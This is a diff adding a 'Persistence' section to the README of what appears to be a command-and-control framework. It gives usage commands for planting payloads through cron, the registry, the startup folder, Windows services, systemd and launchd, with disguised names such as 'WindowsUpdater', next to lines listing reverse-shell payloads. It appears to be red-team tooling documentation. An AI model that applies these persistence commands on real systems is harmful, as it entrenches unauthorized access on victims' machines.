@@ -13,6 +13,7 @@
 - [File Operations](#file-operations)
 - [Task Chaining](#task-chaining-web-ui-only)
 - [Process Injections](#process-injections)
+- [Persistence](#persistence)
 - [Event Monitoring](#event-monitoring)
 - [Security Features](#security-features)
 - [Troubleshooting](#troubleshooting)
@@ -526,6 +527,51 @@ run peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD -
 - windows/x64/shell_reverse_tcp
 - windows/x64/meterpreter/reverse_tcp
 - windows/x64/exec
+
+## Persistence
+
+This is primarily a module that helps operators establishes persistence on systems using various techniques `modules info persistence`
+
+#### Required Options:
+- `agent_id`: ID of the agent to establish persistence on
+- `method`: Persistence method (registry, startup, cron, launchd, systemd, or service)
+- `payload_path`: Path to the payload/script to persist
+
+#### Optional Options:
+- `name`: Name for the persistence mechanism (default: "SystemUpdate")
+- `interval`: Interval for scheduled tasks (minutes, only for cron/systemd) (default: "60")
+
+#### Usage:
+
+**Linux/macOS Cron Persistence:**
+```
+run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
+```
+
+**Windows Registry Persistence:**
+```
+run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
+```
+
+**Windows Startup Folder:**
+```
+run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
+```
+
+**Windows Service:**
+```
+run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
+```
+
+**Linux Systemd Service:**
+```
+run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
+```
+
+**macOS LaunchAgent:**
+```
+run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
+```
 
 
 ## Event Monitoring
